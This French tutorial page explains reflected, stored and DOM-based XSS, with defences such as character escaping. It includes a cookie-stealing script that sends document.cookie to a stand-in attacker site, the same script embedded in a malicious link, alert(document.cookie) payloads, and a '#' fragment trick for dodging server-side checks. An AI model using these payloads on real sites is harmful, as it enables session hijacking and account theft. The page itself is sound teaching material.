<h4>Failles XSS</h4>
<p style="text-align: justify">La faille de Cross Site Scripting est une faille qui permet d’injecter du code HTML, CSS ou JavaScript dans des formulaires.</p>
<p style="text-align: justify">Il existe 3 types de XSS :</p>
<ul>
    <li>Le XSS réfléchi qui est non permanent.</li>
    <li>Le XSS stocké qui lui est permanent.
    </li>
    <li>Le XSS DOM qui consiste à modifier l’environnement DOM du navigateur de la victime
    </li>
</ul>

<h4>XSS Réfléchi</h4>
<p style="text-align: justify">Cette faille est la plus courante et la plus simple à exploiter. Heureusement, il est très facile de s’en prémunir.</p>
<p style="text-align: justify">Très peu de sites aujourd’hui présentent des failles XSS de type réfléchi car la plupart des technologies web bloquent ces failles.</p>
<p style="text-align: justify">On l’appelle non permanente car elle n’est pas stockée en base de données ou dans un fichier, elle est donc éphémère.
Cette faille exploite le fait que l’application Web affiche directement ce qu’un utilisateur a saisi dans un champ de formulaire.
    Le navigateur exécute alors le code frauduleux généré dans la page de résultats.</p>
<p style="text-align: justify">
Voici un exemple très classique, imaginez un site de e-commerce qui présente une barre de recherche pour rechercher un produit particulier.
Lorsqu’un utilisateur utilise cette barre, l’intitulé de la recherche est affiché sur la page des résultats.
    Ainsi si la page est vulnérable aux attaques XSS, le code s’exécutera et s’affichera dans le navigateur de l’utilisateur.</p>
<p style="text-align: justify">Pour illustrer la faille, j’ai créé une page URL vulnérable aux failles XSS qui simule une barre de recherche.
    Si un utilisateur s’amuse à taper la commande suivante dans la barre de recherche :</p>

<p align="center">
    <img src="/images/faille1.png" alt="coucou" style="width: 60%;"><br><br>
</p>

<p style="text-align: justify">Il verra s’afficher la fenêtre de dialogue JavaScript suivante :</p>

<p align="center">
    <img src="/images/faille2.png" alt="coucou" style="width: 80%;"><br><br>
</p>

<p style="text-align: justify">Cependant, les dernières versions de Google Chrome détectent si du code HTML/Javascript a été modifié directement par l’utilisateur.
    Google Chrome bloque alors la page pour éviter l’exécution de code malicieux et affiche la page suivante :</p>
<p align="center">
    <img src="/images/faille3.png" alt="coucou" style="width: 60%;"><br><br>
</p>

<p style="text-align: justify">Pour illustrer, voici comment un attaquant pourrait exploiter une faille XSS de type réfléchi dans le cas d’un formulaire qui passe ses variables par l’URL.
    Par exemple, pour le formulaire précédent, on obtiendrait :</p>
http://site-vulnerable.com?recherche=ma+recherche
<br><br>
<p style="text-align: justify">L’attaquant pourrait essayer de voler les cookies d’un utilisateur.
    Pour cela, il peut utiliser ce script Javascript qui récupère les cookies de session de l’utilisateur.</p>

<code>&lt;script&gt;document.location.href="http://www.site-attaquant.com/recuperation_cookie.php?cookie='+document.cookie’"&lt;/script&gt;</code>
<br><br>

<p style="text-align: justify">L’attaquant fait passer ce script dans l’URL du site vulnérable et envoie le lien à la victime :</p>
<code>http://site-vulnerable.com?recherche=&lt;script&gt;document.location.href="http://www.site-attaquant.com/recuperation_cookie.php?cookie='+document.cookie’"&lt;/script&gt;</code>
<br><br>

<p style="text-align: justify">Si la victime clique sur le lien, elle sera redirigée vers le site de l’attaquant qui lui volera ses cookies.
L’attaquant possède maintenant les cookies de session de l’utilisateur et peut les utiliser sur le site vulnérable.</p>

<p style="text-align: justify">Passons maintenant au deuxième type de faille XSS. </p>
<h4>le XSS stocké.</h4>
<p style="text-align: justify">Cette faille est plus dangereuse que la précédente car n’importe quel utilisateur qui visite le site vulnérable peut être touché.
    En effet, le code frauduleux inséré par l’attaquant reste stocké dans un fichier ou la base de données du site vulnérable.</p>
<p style="text-align: justify">Par exemple, si les utilisateurs ont la possibilité de laisser un message sur un site, ils peuvent insérer du code frauduleux si le site est vulnérable aux faille XSS. </p>
<p style="text-align: justify">Le principe reste le même, l’attaquant envoie un script qui redirige l’utilisateur dans le but de récupérer les cookies de la victime.
    La seule différence est que l’attaquant n’a pas besoin d’envoyer un lien à la victime, les utilisateurs se piègent tout seul en naviguant sur le site vulnérable !</p>
<p style="text-align: justify">Comment s’en protéger ?</p>
<p style="text-align: justify">Il suffit de remplacer les six caractères spéciaux suivant par leur code HTML : &, &lt;, &gt;, " , ‘, /.
    Des fonctions existent déjà, en php on utilisera htmlspecialchars.</p>
<p style="text-align: justify">Côté client comme côté serveur, il faut vérifier que les données reçues sont conformes à celles attendues et les rejeter si elles ne le sont pas.</p>

<h4>XSS DOM :</h4>
<p style="text-align: justify">
Avant d’aborder cette faille, revenons sur la notion de DOM (Document Object Model).
    Ce modèle permet de représenter une page HTML sous la forme d’un arbre comme illustré sur la figure ci-dessous. </p>
<p style="text-align: justify">Le DOM est généré par le navigateur web.
    Il est principalement utilisé pour que les scripts Javascript puissent facilement accéder et modifier le contenu d’une page web.</p>
<p align="center">
    <img src="/images/faille4.png" alt="coucou" style="width: 40%;"><br><br>
</p>

<p style="text-align: justify">La faille XSS DOM consiste à injecter du code malicieux pour modifier le DOM de la page web.
    A la différence des 2 failles précédentes (XSS stockés et réfléchis), la faille XSS DOM est une faille qui introduit du code malicieux au niveau du client. </p>
<p style="text-align: justify">C’est le script Javascript exécuté sur le navigateur du client qui va modifier le DOM de la page web et provoquer un comportement non voulu (récupération de cookie par exemple). </p>
<p style="text-align: justify">Pour les failles XSS stockés et réfléchis, c’est le serveur qui contre sa volonté produit une page web html avec du code malicieux glissé dedans.</p>
<p style="text-align: justify">Prenons un exemple bien documenté par l’OWASP :</p>
<p style="text-align: justify">Imaginez une page html avec le formulaire suivant pour le choix de la langue favorite :</p>

<code>
Select your language:<br><br>
&lt;select&gt;&lt;script&gt;<br>

    <p class="tabulation">document.write("&lt;OPTION value=1&gt;"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"&lt;/OPTION&gt;");<br></p>

    <p class="tabulation">document.write("&lt;OPTION value=2&gt;English&lt;/OPTION&gt;");<br></p>

    &lt;script&gt;&lt;/select&gt;<br>
</code>
<br>
<p style="text-align: justify">La page contenant ce formulaire est invoquée grâce à l’URL suivante :</p>
<code>
http://www.some.site/page.html?default=French<br><br>
</code>
<p style="text-align: justify">où ici nous avons spécifié que le langage préféré était le français.</p>

<p style="text-align: justify">Le DOM de la page web va être généré et grâce au script, il y aura 2 options pour la langue favorite : français et anglais.</p>
<p style="text-align: justify">Détournons maintenant l’utilisation de ce script pour y introduire du code malicieux.
    En modifiant l’URL pour accéder à la page du formulaire de la façon suivante, on pourra afficher les cookies de l’utilisateur.</p>
<code>
http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
<br><br>
<p style="text-align: justify">Le navigateur de l’utilisateur va alors générer l’objet DOM et insérer dans le formulaire le code frauduleux qui va être exécuté par le navigateur.
    Les cookies seront alors affichés dans une fenêtre pop-up.
    On peut maintenant imaginer un cas réaliste où un attaquant insère un script qui récupère les cookies de la victime et les envoie sur le serveur de l’attaquant.</p>

<h5>Nota Bene :</h5>
<p style="text-align: justify">Bien que le code malicieux ne soit pas traité côté serveur, il passe quand même par le serveur au moment de la requête HTTP pour récupérer la page.
    Ainsi, des vérifications côté serveur pourraient être effectuées pour échapper les caractères spéciaux Javascript et ainsi empêcher l’exécution du script.</p>

<code>http://www.some.site/page.html#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
<br><br>
<p style="text-align: justify">Cependant, ces vérifications côté serveur peuvent être détournées en utilisant le # dans l’URL.
    Tout ce qui est après le # dans une URL n’est pas envoyé au serveur.
    Cependant, le navigateur du client interprétera tout de même le script placé derrière le # et l’attaque sera effective.</p>

